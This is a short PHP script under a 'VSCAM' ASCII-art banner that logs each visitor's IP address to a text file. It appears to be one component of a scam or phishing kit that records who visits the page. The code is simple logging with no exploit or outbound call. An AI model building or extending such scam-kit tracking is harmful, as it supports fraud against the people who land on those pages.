<?php
/* 
-                                                                                   
 ____      ____          ______        _____         _____        ______  _______   
|    |    |    |     ___|\     \   ___|\    \    ___|\    \      |      \/       \  
|    |    |    |    |    |\     \ /    /\    \  /    /\    \    /          /\     \ 
|    |    |    |    |    |/____/||    |  |    ||    |  |    |  /     /\   / /\     |
|    |    |    | ___|    \|   | ||    |  |____||    |__|    | /     /\ \_/ / /    /|
|    |    |    ||    \    \___|/ |    |   ____ |    .--.    ||     |  \|_|/ /    / |
|\    \  /    /||    |\     \    |    |  |    ||    |  |    ||     |       |    |  |
| \ ___\/___ / ||\ ___\|_____|   |\ ___\/    /||____|  |____||\____\       |____|  /
 \ |   ||   | / | |    |     |   | |   /____/ ||    |  |    || |    |      |    | / 
  \|___||___|/   \|____|_____|    \|___|    | /|____|  |____| \|____|      |____|/  
    \(    )/        \(    )/        \( |____|/   \(      )/      \(          )/     
     '    '          '    '          '   )/       '      '        '          '      
                                         '                                          */
#------------------------------[VSCAM - VISITORS]------------------------------#
$handle = fopen('log.txt', 'a');
$data = "\nVISITORS: " . $_SERVER['REMOTE_ADDR'] . "\n";
fwrite($handle, $data);
fclose($handle);
 
?>